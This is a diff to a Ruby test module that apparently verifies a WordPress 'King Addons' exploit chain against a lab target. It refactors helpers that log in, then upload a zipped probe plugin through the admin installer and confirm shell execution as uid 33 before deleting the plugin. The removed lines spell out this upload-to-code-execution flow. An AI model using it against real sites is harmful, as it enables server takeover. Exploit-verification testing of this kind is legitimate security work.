@@ -1,14 +1,13 @@
 # frozen_string_literal: true
 
-require 'nokogiri'
-require 'rex/mime/message'
-require 'rex/zip'
+require_relative '../wordpress/plugin_controls'
 require_relative '../wp_batch_desync_rce/native'
 
 # Retain independent vendor controls while reusing bounded transport, commands,
 # callback, resource and reporting helpers. The core SQLi gate is not invoked.
 module KingAddonsNative
   include WordpressBatchChainTarget
+  include WordpressNativePluginControls
 
   def chain_save
     File.write(File.join(target_runtime.fetch('artifacts'), 'native-king-addons.json'), JSON.pretty_generate(@chain)) if @chain
@@ -69,72 +68,18 @@ module KingAddonsNative
     expect(king_selected_state(current)).to eq(king_selected_state(original))
   end
 
-  def king_fields(response)
-    Nokogiri::HTML(response.body).css('input[name]').to_h { |input| [input['name'], input['value'].to_s] }
-  end
-
-  def king_cookies(response)
-    Array(response.get_fields('set-cookie')).to_h { |text| text.split(';', 2).first.split('=', 2) }.map { |name, value| name + '=' + value }.join('; ')
-  end
-
-  def king_cookie_id(label, response)
-    values = Array(response.get_fields('set-cookie')).filter_map do |text|
-      text.split(';', 2).first.split('=', 2).last if text.start_with?('wordpress_logged_in_')
-    end
-    cookie = URI.decode_www_form_component(values.reverse.find { |value| !value.empty? }.to_s)
-    chain_identity(label + '-cookie', 'cookie', Base64.strict_encode64(cookie)).fetch('operation_result').fetch('validated_user_id')
-  end
-
-  def king_login(label, name, password, agent)
-    form = chain_http(label + '-form', @prefix + '/wp-login.php', headers: { 'User-Agent' => agent })
-    expect(form.code).to eq('200')
-    response = chain_http(label, @prefix + '/wp-login.php', { 'log' => name, 'pwd' => password, 'wp-submit' => 'Log In', 'testcookie' => '1' }, form: true, headers: { 'Cookie' => king_cookies(form), 'User-Agent' => agent })
-    expect(response.code).to eq('302')
-    [king_cookies(response), king_cookie_id(label, response)]
-  end
-
-  def king_admin_page(label, cookie, agent, identifier, name, allowed: true)
-    8.times do |step|
-      response = chain_http(label + '-' + step.to_s, @prefix + '/wp-admin/users.php', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
-      unless allowed
-        expect(%w[302 403]).to include(response.code)
-        return response
-      end
-      if response.code == '200'
-        expect(Nokogiri::HTML(response.body).at_css('tr#user-' + identifier.to_s)&.text).to include(name)
-        return response
-      end
-      expect(response.code).to eq('302')
-      location = URI(response.fetch('location'))
-      expect(%w[module-target.test 127.0.0.1]).to include(location.host)
-      expect(location.path).to start_with(@prefix + '/wp-admin/')
-      route = location.path + (location.query ? '?' + location.query : '')
-      chain_http(label + '-activation-' + step.to_s, route, headers: { 'Cookie' => cookie, 'User-Agent' => agent })
-    end
-    raise 'Native activation redirects did not reach the real users page'
-  end
+  alias king_fields wordpress_native_fields
+  alias king_cookies wordpress_native_cookies
+  alias king_cookie_id wordpress_native_cookie_id
+  alias king_login wordpress_native_login
+  alias king_admin_page wordpress_native_admin_page
 
   def king_native_plugin(label, cookie, agent)
-    path = @prefix + '/wp-content/plugins/native_king_probe/native-proof.php'
-    expect(chain_http(label + '-absent', path).code).to eq('404')
-    upload = chain_http(label + '-form', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
-    expect(upload.code).to eq('200')
-    source = File.binread(File.join(__dir__, 'probe-plugin.php'))
-    archive = Rex::Zip::Archive.new
-    archive.add_file('native_king_probe/native-proof.php', source)
-    multipart = Rex::MIME::Message.new
-    multipart.add_part(king_fields(upload).fetch('_wpnonce'), nil, nil, 'form-data; name="_wpnonce"')
-    multipart.add_part('Install Now', nil, nil, 'form-data; name="install-plugin-submit"')
-    multipart.add_part(archive.pack, 'application/zip', 'binary', 'form-data; name="pluginzip"; filename="native-king.zip"')
-    response = chain_http(label + '-upload', @prefix + '/wp-admin/update.php?action=upload-plugin', multipart.to_s, raw: true, headers: { 'Cookie' => cookie, 'User-Agent' => agent, 'Content-Type' => 'multipart/form-data; boundary=' + multipart.bound })
-    expect(response.code).to eq('200')
-    proof = chain_http(label + '-execution', path)
-    expect(proof.code).to eq('200')
-    data = JSON.parse(proof.body)
-    expect(data.values_at('marker', 'uid', 'bash')).to eq(['MODULE_TARGET_NATIVE_KING_PROOF', 33, true])
-    expect(data.fetch('shell')).to start_with('uid=33(')
-    (@chain[:native_execution] ||= []) << { label: label, **data }
-    chain_identity(label + '-removed', 'delete-plugin', Digest::SHA256.hexdigest(source))
+    wordpress_native_plugin(
+      label, cookie, agent,
+      slug: 'native_king_probe', source: File.binread(File.join(__dir__, 'probe-plugin.php')),
+      marker: 'MODULE_TARGET_NATIVE_KING_PROOF', filename: 'native-king.zip'
+    )
   end
 
   def chain_native_gate(phase)
